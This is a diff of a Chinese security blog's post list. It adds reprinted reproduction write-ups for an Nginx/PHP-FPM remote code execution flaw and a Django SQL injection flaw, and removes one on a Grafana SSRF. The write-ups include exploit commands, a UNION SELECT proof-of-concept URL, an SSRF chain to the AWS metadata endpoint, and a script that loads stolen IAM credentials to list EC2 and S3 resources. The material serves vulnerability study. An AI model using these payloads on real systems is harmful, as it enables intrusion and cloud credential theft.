@@ -87,6 +87,172 @@
 
     
         <h2 class="title">
+            <a href="/2024/01/25/CVE-2019-11043-Nginx/">
+                CVE-2019-11043漏洞分析与复现
+            </a>
+        </h2>
+    
+    <time>
+        Jan 25, 2024
+    </time>
+    <section class="content">
+        <h1><span id="cve-2019-11043漏洞分析与复现">CVE-2019-11043漏洞分析与复现</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://www.cnblogs.com/st66/p/14735800.html">STong66</a> 并作补充</p>
+</blockquote>
+<h2><span id="漏洞描述">漏洞描述</span></h2><blockquote>
+<p>Nginx 上 fastcgi_split_path_info 在处理带有 %0a 的请求时，会因为遇到换行符 \n 导致 PATH_INFO 为空。而 php-fpm 在处理 PATH_INFO</p>
+<p>为空的情况下，存在逻辑缺陷。攻击者通过精心的构造和利用，可以导致远程代码执行。</p>
+<p>该漏洞需要在nginx.conf中进行特定配置才能触发。具体配置如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">location ~ [^/]\.<span class="title function_ invoke__">php</span>(/|$) &#123;</span><br><span class="line"></span><br><span class="line"> ...</span><br><span class="line"></span><br><span class="line"> fastcgi_split_path_info ^(.+?\.php)(/.*)$;</span><br><span class="line"></span><br><span class="line"> fastcgi_param PATH_INFO <span class="variable">$fastcgi_path_info</span>;</span><br><span class="line"></span><br><span class="line"> fastcgi_pass   php:<span class="number">9000</span>;</span><br><span class="line"></span><br><span class="line"> ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>攻击者可以使用换行符（％0a）来破坏<code>fastcgi_split_path_info</code>指令中的Regexp。Regexp被损坏导致PATH_INFO为空，从而触发该漏洞。</p>
+</blockquote>
+<h3><span id="漏洞类型">漏洞类型</span></h3><blockquote>
+<p>远程代码执行漏洞</p>
+</blockquote>
+<h3><span id="危险等级">危险等级</span></h3><blockquote>
+<p>高危</p>
+</blockquote>
+<h3><span id="利用条件">利用条件</span></h3><blockquote>
+<p>nginx配置了fastcgi_split_path_info</p>
+</blockquote>
+<h3><span id="受影响系统">受影响系统</span></h3><blockquote>
+<p>PHP 5.6-7.x，Nginx&gt;&#x3D;0.7.31</p>
+</blockquote>
+<h2><span id="漏洞复现">漏洞复现</span></h2><blockquote>
+<p>使用某个大佬的 docker 环境进行复现：</p>
+<p>PHP-FPM 远程代码执行漏洞（CVE-2019-11043）</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/php/CVE-2019-11043/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/php/CVE-2019-11043/README.zh-cn.md</a></p>
+</blockquote>
+<h3><span id="准备工作安装-docker-golang-环境">准备工作：安装 docker、golang 环境</span></h3><blockquote>
+<p>在kali中使用如下命令安装docker和golang：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install docker docker-compose</span><br><span class="line">sudo apt install golang</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/25/CVE-2019-11043-Nginx/1.png" alt="image"></p>
+<p><img src="/2024/01/25/CVE-2019-11043-Nginx/2.png" alt="image"></p>
+<p><img src="/2024/01/25/CVE-2019-11043-Nginx/3.png" alt="image"></p>
+</blockquote>
+<h3><span id="搭建漏洞环境">搭建漏洞环境</span></h3><blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/vulhub/vulhub.git</span><br><span class="line"><span class="built_in">cd</span> vulhub/php/CVE-2019-11043 &amp;&amp; docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/25/CVE-2019-11043-Nginx/4.png" alt="image"></p>
+<p><img src="/2024/01/25/CVE-2019-11043-Nginx/5.png" alt="image"></p>
+<p><img src="/2024/01/25/CVE-2019-11043-Nginx/6.png" alt="image"></p>
+<p><img src="/2024/01/25/CVE-2019-11043-Nginx/7.png" alt="image"></p>
+</blockquote>
+<h3><span id="安装漏洞利用工具">安装漏洞利用工具</span></h3><blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/neex/phuip-fpizdam.git</span><br><span class="line"><span class="built_in">cd</span> phuip-fpizdam</span><br><span class="line">go get -v &amp;&amp; go build</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/25/CVE-2019-11043-Nginx/8.png" alt="image"></p>
+<p><img src="/2024/01/25/CVE-2019-11043-Nginx/9.png" alt="image"></p>
+</blockquote>
+<h3><span id="漏洞利用">漏洞利用</span></h3><blockquote>
+<p><strong>在phuip-fpizdam目录下执行 go run . “<a target="_blank" rel="noopener" href="http://127.0.0.1:8080/index.php&quot;%E5%90%8E%E6%88%90%E5%8A%9F%E6%98%BE%E7%A4%BA%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%88%90%E5%8A%9F%E3%80%82">http://127.0.0.1:8080/index.php&quot;后成功显示漏洞利用成功。</a></strong></p>
+<p><strong>在浏览器进行了如下请求，成功复现，可以执行系统命令,id可以替换为其他OS命令。</strong></p>
+<p><img src="/2024/01/25/CVE-2019-11043-Nginx/10.png" alt="image"></p>
+</blockquote>
+<h3><span id="漏洞分析">漏洞分析</span></h3><blockquote>
+<p>具体漏洞信息可参考：<a target="_blank" rel="noopener" href="https://github.com/php/php-src/commit/ab061f95ca966731b1c84cf5b7b20155c0a1c06a#diff-624bdd47ab6847d777e15327976a9227">https://github.com/php/php-src/commit/ab061f95ca966731b1c84cf5b7b20155c0a1c06a/#diff-624bdd47ab6847d777e15327976a9227</a></p>
+<p>有漏洞信息可知漏洞是由于path_info 的地址可控导致的，我们可以看到，当path_info 被%0a截断时，path_info 将被置为空，回到代码中我就发现问题所在了。</p>
+<p>如下漏洞代码</p>
+<p><img src="/2024/01/25/CVE-2019-11043-Nginx/11.png" alt="image"></p>
+<p>在代码的1134行我们发现了可控的 path_info 的指针env_path_info</p>
+<p>其中</p>
+<p>env_path_info 就是变量path_info 的地址，path_info 为0则plien 为0。</p>
+<p>slen 变量来自于请求后url的长度 int ptlen &#x3D; strlen(pt); int slen &#x3D; len - ptlen;</p>
+<p>由于<code>apache_was_here</code>这个变量在前面被设为了0，因此path_info的赋值语句实际上就是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">path_info = env_path_info ? env_path_info + pilen - slen : NULL;</span><br></pre></td></tr></table></figure>
+
+<p>env_path_info是从Fast CGI的PATH_INFO取过来的，而由于代入了<code>%0a</code>，在采取<code>fastcgi_split_path_info ^(.+?\.php)(/.*)$;</code>这样的Nginx配置项的情况下，fastcgi_split_path_info无法正确识别现</p>
+<p>在的url，因此会Path Info置空，所以env_path_info在进行取值时，同样会取到空值，这也正是漏洞原因所在。</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Nginx/" rel="tag">Nginx</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2024/01/25/CVE-2022-28346-Django/">
+                Django SQL注入漏洞 (CVE-2022-28346)
+            </a>
+        </h2>
+    
+    <time>
+        Jan 25, 2024
+    </time>
+    <section class="content">
+        <h1><span id="django-sql注入漏洞-cve-2022-28346">Django SQL注入漏洞 (CVE-2022-28346)</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46944519/article/details/128496498">李火火安全阁</a> 并作补充</p>
+</blockquote>
+<h2><span id="一-简介">一、简介</span></h2><blockquote>
+<p>Django是用<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=Python%E5%BC%80%E5%8F%91&spm=1001.2101.3001.7020">Python开发</a>的一个免费开源的Web结构，几乎包括了Web使用方方面面，能够用于快速建立高性能、文雅的网站，Diango提供了许多网站后台开发常常用到的模块，使开发者可以专注于业务部分。</p>
+</blockquote>
+<h2><span id="二-漏洞概述">二、漏洞概述</span></h2><blockquote>
+<p>漏洞编号：CVE-2022-28346</p>
+<p>攻击者使用精心编制的字典，通过 **kwargs 传递给QuerySet.annotate()、aggregate()和extra()这些方法，可导致这些方法在列别名中受到SQL注入攻击，该漏洞在 2.2.28 之前的 Django 2.2、3.2.13 之前的 3.2 和 4.0.4 之前的 4.0 中都存在这个问题。</p>
+</blockquote>
+<h2><span id="三-漏洞影响版本">三、漏洞影响版本</span></h2><blockquote>
+<ul>
+<li>4.0 &lt;&#x3D; Django &lt; 4.0.4</li>
+<li>3.2 &lt;&#x3D; Django &lt; 3.2.13</li>
+<li>2.2 &lt;&#x3D; Django &lt; 2.2.28</li>
+</ul>
+</blockquote>
+<h2><span id="四-漏洞分析">四、漏洞分析</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="http://cn-sec.com/archives/962127.html">http://cn-sec.com/archives/962127.html</a></p>
+</blockquote>
+<h2><span id="五-漏洞复现">五、漏洞复现</span></h2><h3><span id="docker">Docker</span></h3><blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull s0cke3t/cve-2022-28346:latest</span><br><span class="line">docker run -d -p 8080:8000 s0cke3t/cve-2022-28346</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3><span id="本地环境搭建">本地环境搭建</span></h3><blockquote>
+<p>环境下载：<code>https://github.com/DeEpinGh0st/CVE-2022-28346</code></p>
+<p>Python：3.9.8<br>Django：3.2.11</p>
+</blockquote>
+<h3><span id="本地启动">本地启动</span></h3><blockquote>
+<p>环境初始化</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python manage.py makemigrations</span><br><span class="line">python manage.py migrate</span><br><span class="line">访问http://x.x.x.x:8000/ 插入初始化数据</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/25/CVE-2022-28346-Django/1.png" alt="image"></p>
+<p>浏览器访问</p>
+<p><img src="/2024/01/25/CVE-2022-28346-Django/2.png" alt="image"></p>
+<p>访问404可以获取到报错页面查看报错信息得到传参接口(注入点接口)</p>
+<p><img src="/2024/01/25/CVE-2022-28346-Django/3.png" alt="image"></p>
+<p>访问到demo&#x2F; 目录下，同样会出现报错信息</p>
+<p><img src="/2024/01/25/CVE-2022-28346-Django/4.png" alt="image"></p>
+<p>利用报错中提示的参数进行SQL注入<br>POC：<code>http://x.x.x.x:8000/demo?field=demo.name&quot; FROM &quot;demo_user&quot; union SELECT &quot;1&quot;,sqlite_version(),&quot;3&quot; –</code></p>
+<p><img src="/2024/01/25/CVE-2022-28346-Django/5.png" alt="image"></p>
+</blockquote>
+<h2><span id="六-修复方法">六、修复方法</span></h2><blockquote>
+<p>官方已发布安全版本<br>下载地址：<a target="_blank" rel="noopener" href="https://www.djangoproject.com/download/">https://www.djangoproject.com/download/</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Django/" rel="tag">Django</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/SQL-Injection/" rel="tag">SQL Injection</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2024/01/23/CVE-2023-3696-Mongoose/">
                 Mongoose Prototype Pollution Vulnerability in automattic/mongoose(CVE-2023-3696)
             </a>
@@ -1131,157 +1297,6 @@
         
             <div class="tags">
                 <a class="tag-none-link" href="/tags/Android/" rel="tag">Android</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2024/01/19/CVE-2020-13379-Grafana/">
-                挖洞经验 | Grafana应用实例未授权读取型SSRF（CVE-2020-13379）
-            </a>
-        </h2>
-    
-    <time>
-        Jan 19, 2024
-    </time>
-    <section class="content">
-        <h1><span id="挖洞经验-grafana应用实例未授权读取型ssrfcve-2020-13379">挖洞经验 | Grafana应用实例未授权读取型SSRF（CVE-2020-13379）</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/245582.html">clouds</a> 并作补充</p>
-<p><strong>近期，我在做Grafana公司的安全众测，通过研究我发现综合利用重定向跳转和URL参数注入漏洞，可以在Grafana产品任意实例中实现未授权的服务端请求伪造攻击（SSRF），漏洞影响版本为3.0.1至7.0.1的大范围Grafana产品，相关情况上报后被分配了CVE-2020-13379的漏洞编号。（漏洞PDF技术细节<a target="_blank" rel="noopener" href="https://docs.google.com/presentation/d/1He_zFFXCuft3LsZTXbHKoDxQHNoSveZg2c2uF1HKuaw/edit?usp=sharing">点此下载</a>）</strong></p>
-</blockquote>
-<h2><span id="漏洞发现过程">漏洞发现过程</span></h2><blockquote>
-<p>在Grafana名为<a target="_blank" rel="noopener" href="https://github.com/grafana/grafana/blob/78febbbeef1f23ccbb88c2bd3acd2e9c2011e02a/pkg/api/api.go#L423">api.go的开源文件</a>中，位于其第423行有这么一行代码：</p>
-<p><code>r.Get(&quot;/avatar/:hash&quot;, avatarCacheServer.Handler)</code></p>
-<p>为了加载用户上传保存于gravatar上的头像图片，该行代码读取**&#x2F;avatar&#x2F;:hash<strong>中的哈希值（如</strong><a target="_blank" rel="noopener" href="https://www.gravatar.com/avatar/205e460b479e2e5b48aec07710c08d50/.....**%EF%BC%89%EF%BC%8C%E5%B9%B6%E6%8A%8A%E5%AE%83%E4%BC%A0%E9%80%92%E7%BB%99%E5%9F%9F%E5%90%8D%E4%B8%BA**secure.grafana.com**%E7%9A%84%E7%9B%B8%E5%85%B3%E8%B7%AF%E5%BE%84%E3%80%82%E8%BF%99%E9%87%8C%EF%BC%8C%E5%A4%A7%E8%87%B4%E7%9A%84%E4%BB%A3%E7%A0%81%E9%80%BB%E8%BE%91%E5%A6%82%E4%B8%8B%EF%BC%9A">https://www.gravatar.com/avatar/205e460b479e2e5b48aec07710c08d50/.....**），并把它传递给域名为**secure.grafana.com**的相关路径。这里，大致的代码逻辑如下：</a></p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">const (</span><br><span class="line"> gravatarSource = <span class="string">&quot;https://secure.gravatar.com/avatar/&quot;</span></span><br><span class="line">)</span><br><span class="line">...</span><br><span class="line"><span class="type">case</span> <span class="variable">err</span> <span class="operator">=</span> &lt;-thunder.GoFetch(gravatarSource+<span class="built_in">this</span>.hash+<span class="string">&quot;?&quot;</span>+<span class="built_in">this</span>.reqParams, <span class="built_in">this</span>):</span><br></pre></td></tr></table></figure>
-
-<p>上述代码逻辑中的<strong>this.hash</strong>也就是前述**&#x2F;avatar&#x2F;:hash<strong>经URL编码传递过来的hash，实际上这个被URL编码过的</strong>:hash<strong>串中，允许我们插入其它参数从而形成URL参数注入。在secure.gravatar.com域名路径下，如果向其中插入参数d，即</strong><a target="_blank" rel="noopener" href="https://secure.gravatar.com/avatar/205e460b479e2e5b48aec07710c08d50?d=....**%EF%BC%8C%E4%B9%8B%E5%90%8E%EF%BC%8C%E5%B0%B1%E4%BC%9A%E5%8F%91%E7%94%9F%E8%B7%B3%E8%BD%AC%E5%88%B0%E5%8F%A6%E4%B8%80%E4%B8%AA%E5%9B%BE%E7%89%87%E5%AD%98%E5%82%A8%E6%9C%8D%E5%8A%A1**i0.wp.com**%E7%9A%84%E6%83%85%E5%86%B5%EF%BC%8C%E8%BF%99%E6%98%AF%E5%90%8E%E7%BB%AD%E8%B7%B3%E8%BD%AC%E5%88%A9%E7%94%A8%E9%93%BE%E4%B8%AD%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E8%B7%B3%E8%BD%AC%E9%97%AE%E9%A2%98%E3%80%82">https://secure.gravatar.com/avatar/205e460b479e2e5b48aec07710c08d50?d=....**，之后，就会发生跳转到另一个图片存储服务**i0.wp.com**的情况，这是后续跳转利用链中的第一个跳转问题。</a></p>
-<p>所以，我们还需要从i0.wp.com继续构造跳转，好在最后，由于主机验证机制中一个不当的正则表达式应用，我们成功形成了跳转。过程是这样的：</p>
-<p>i0.wp.com中的URL链接构造为**i0.wp.com&#x2F;{domainOfImage}&#x2F;{pathOfImage}*<em>，该URL链接的目的在于，i0.wp.com依托.bp.blogspot.com域名存储了自身的一部份图片，因此，i0.wp.com还会继续形成对</em>.bp.blogspot.com的跳转。后经我花费了几个小时的测试，发现利用以下链接可在该跳转中形成一个开放重定向跳转：</p>
-<p><code>http://i0.wp.com/google.com?;/1.bp.blogspot.com/</code></p>
-<p>最终，综合两个跳转，可以在Grafana后台形成以下跳转链接：</p>
-<p><code>https://grafanaHost/avatar/test?d=google.com%3f;/bp.blogspot.com</code></p>
-<p>在以上链接中，Grafana后台会获取<strong>test?d&#x3D;google.com%3f;&#x2F;bp.blogspot.com</strong>作为**:hash**值。</p>
-<p>回到前述的d参数场景中，在以下链接中加入d参数：</p>
-<p><code>https://secure.gravatar.com/avatar/anything?d=google.com%3f;/1.bp.blogspot.com/</code></p>
-<p>该请求会发生一个到i0.wp.com的跳转，成为：</p>
-<p><code>http://i0.wp.com/google.com%3f%;/1.bp.blogspot.com/</code></p>
-<p>然后，i0.wp.com会继续发生指向google.com的跳转，成为：</p>
-<p><code>https://google.com?;/1.bp.blogspot.com</code></p>
-<p>在<a target="_blank" rel="noopener" href="https://github.com/grafana/grafana/blob/78febbbeef1f23ccbb88c2bd3acd2e9c2011e02a/pkg/api/avatar/avatar.go#L90;L115"><strong>用户头像avatar的源码文件</strong></a>中可以看到，其中具备内容类型属性信息<strong>Content-Type: image&#x2F;jpeg</strong>，以及请求后的相关响应机制：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">if</span> avatar.Expired() &#123;</span><br><span class="line"> <span class="comment">// The cache item is either expired or newly created, update it from the server</span></span><br><span class="line"> <span class="keyword">if</span> err := avatar.Update(); err != nil &#123;</span><br><span class="line">  log.Trace(<span class="string">&quot;avatar update error: %v&quot;</span>, err)</span><br><span class="line">  avatar = <span class="built_in">this</span>.notFound</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> avatar.notFound &#123;</span><br><span class="line"> avatar = <span class="built_in">this</span>.notFound</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> !exists &#123;</span><br><span class="line"> <span class="keyword">if</span> err := <span class="built_in">this</span>.cache.Add(hash, avatar, gocache.DefaultExpiration); err != nil &#123;</span><br><span class="line">  log.Trace(<span class="string">&quot;Error adding avatar to cache: %s&quot;</span>, err)</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctx.Resp.Header().Add(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;image/jpeg&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> !setting.EnableGzip &#123;</span><br><span class="line"> ctx.Resp.Header().Add(<span class="string">&quot;Content-Length&quot;</span>, strconv.Itoa(len(avatar.data.Bytes())))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctx.Resp.Header().Add(<span class="string">&quot;Cache-Control&quot;</span>, <span class="string">&quot;private, max-age=3600&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := avatar.Encode(ctx.Resp); err != nil &#123;</span><br><span class="line"> log.Warn(<span class="string">&quot;avatar encode error: %v&quot;</span>, err)</span><br><span class="line"> ctx.WriteHeader(<span class="number">500</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>因此，综上所述的各种技术利用点，可以构造出以下成功的SSRF运行链接，让Grafana后台服务器发起对YOURHOSTHERE的请求。</p>
-<p><code>https://grafanaHost/avatar/test?d=redirect.rhynorater.com?;/bp.blogspot.com/YOURHOSTHERE</code></p>
-<p>该漏洞影响的不仅只是Grafana的产品实例，而且其在<strong>Gitlab（&#x2F;-&#x2F;grafana）和SourceTree（&#x2F;-&#x2F;debug&#x2F;grafana&#x2F;）</strong>上的源码实例也受影响。</p>
-</blockquote>
-<h2><span id="漏洞利用">漏洞利用</span></h2><blockquote>
-<p>正如<a target="_blank" rel="noopener" href="https://www.hackerone.com/hacktivitycon">我在HackerOne的HacktivityCon会上所说的</a>, 该漏洞有多个有意思的利用点。接下来，我就来分享一下具体的漏洞利用方式。</p>
-</blockquote>
-<h3><span id="漏洞利用1-对grafana项目云实例元数据api的操控访问manipulate-awsx2fcloud-metadata-apis">漏洞利用1-对Grafana项目云实例元数据API的操控访问（Manipulate AWS&#x2F;Cloud Metadata APIs）</span></h3><blockquote>
-<p>现代SSRF漏洞的一种流行利用就是用它去执行对目标系统云上元数据API接口的访问，以从中获得相关敏感信息。元数据API接口大多都是AWS的云形式，我们可以设法从中获取到Grafana项目EC2实例中的用户身份验证授权凭证（IAM），然后以此横向渗透到组织机构内网。迄今为止，攻击者已经利用此种SSRF利用方法渗透入侵，导致了一些大规模的数据泄露事件。</p>
-<p>作为攻击者来说，主要关心的就是尝试从公开的AWS元数据服务器（169.254.169.254）中，用以下访问链接获取用户IAM凭证：</p>
-<p><code>http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE（实例项目名称）</code></p>
-<p>成功获取的用户IAM凭证内容如下：</p>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Code&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;Success&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;LastUpdated&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;2019-08-15T18:13:44Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Type&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;AWS-HMAC&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;AccessKeyId&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;ASIAN0P3n0W4y1nv4L1d&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;SecretAccessKey&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;A5tGuw2QXjmqu8cTEu1zs0Dw8yt905HDCzrF0AdE&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Token&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;AgoJb3JpZ2luX2VjEJv//////////wEaCXVzLWVhc3QtMSJHMEUCIEX46oh4kz6AtBiTfvoHGqfVuHJI29ryAZy/wXyR51SAiEA04Pyw9HSwSIRNx6vmYpqm7sD+DkLQiFzajuwI2aLEp4q8gMIMxABGgwzNjY4OTY1NTU5NDkiDOBEJDdUKxKUkgkhGyrPA7u8oSds5hcIM0EeoHvgxvCX/ChiDsuCEFO1ctMpOgaQuunsvKLzuaTp/86V96iZzuoPLnpHHsmIUTrCcwwGqFzyaqvJpsFWdv89YIhARAMlcQ1Cc9Cs4pTBSYc/BvbEFb1z0xWqPlBNVKLMzm2K5409f/KCK/eJsxp530Zt7a1MEBp/rvceyiA5gg+6hOu65Um+4BNT+CjlEk3gwL6JUUWr9a2LKYxmyR4fc7XtLD2zB0jwdnG+EPv7aDPj7EoWMUoR/dOQav/oSHi7bl6+kT+koKzwhU/Q286qsk0kXMfG/U95TdUr70I3b/L/dhyaudpLENSU7uvPFi8qGVGpnCuZCvGL2JVSnzf8327jyuiTF7GvXlvUTh8bjxnZ8pAhqyyuxEW1tosL2NuqRHmlCCfnE3wLXJ0yBUr7uxMHTfL1gueEWghymIGhAxiYIKA9PPiHCDrn4gl5AGmLyzqxenZgcNnuwMjeTnhQ0mVf7L8PR4ZWRo9h3C1wMbYnYNi5rdfQcByMIN/XoR2J74sBPor/aObMMHVnmpNjbtRgKh0Vpi48VgXhXfuCAHka3rbYeOBYC8z8nUWYJKuxv3Nj0cQxXDnYT6LPPXmtHgZaBSUwxMHW6gU6tAHi8OEjskLZG81wLq1DiLbdPJilNrv5RPn3bBF+QkkB+URAQ8NBZA/z8mNnDfvESS44fMGFsfTIvIdANcihZQLo6VYvECV8Vw/QaLP/GbljKPwztRC5HSPe6WrC06LZS9yeTpVGZ6jFIn1O/01hJOgEwsK7+DDwcXtE5qtOynmOJiY/iUjcz79LWh184My58ueCNxJuzIM9Tbn0sH3l1eBxECTihDNbL13v5g+8ENaih+f3rNU=&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Expiration&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;2019-08-16T00:33:31Z&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
-
-<p>有了这个IAM凭证，我们就能通过用户身份验证这一关，以内部用户身份执行对EC2实例和S3存储桶的任意访问。如果要用IAM来执行深入的用户验证测试危害证明，我推荐使用<a target="_blank" rel="noopener" href="https://github.com/nccgroup/Scout2">NCCGroup安全团队的Scout2工具</a>，不过由于它会产生大量的请求响应，而且会引发一系列的密钥轮换数据，有点太过于Noisy了。这里我还是用以下标准输入的脚本方式来利用上述IAM凭证吧：</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">out=$(<span class="built_in">cat</span> -)</span><br><span class="line"><span class="built_in">export</span> AWS_ACCESS_KEY_ID=$(<span class="built_in">echo</span> <span class="variable">$out</span> | jq .AccessKeyId | sed <span class="string">&#x27;s/&quot;//g&#x27;</span> )</span><br><span class="line"><span class="built_in">export</span> AWS_SECRET_ACCESS_KEY=$(<span class="built_in">echo</span> <span class="variable">$out</span> | jq .SecretAccessKey | sed <span class="string">&#x27;s/&quot;//g&#x27;</span>)</span><br><span class="line"><span class="built_in">export</span> AWS_DEFAULT_REGION=us-east-1</span><br><span class="line"><span class="built_in">export</span> AWS_SESSION_TOKEN=$(<span class="built_in">echo</span> <span class="variable">$out</span> | jq .Token | sed <span class="string">&#x27;s/&quot;//g&#x27;</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Profile loaded!&quot;</span></span><br><span class="line">aws sts get-caller-identity</span><br><span class="line">aws ec2 describe-instances &gt; ec2Instances.txt</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;EC2 Instances outputted to \&quot;ec2Instances.txt\&quot;!&quot;</span></span><br><span class="line">aws s3api list-buckets &gt; s3Buckets.txt</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;S3 Buckets outputted to \&quot;s3Buckets.txt\&quot;!&quot;</span></span><br></pre></td></tr></table></figure>
-
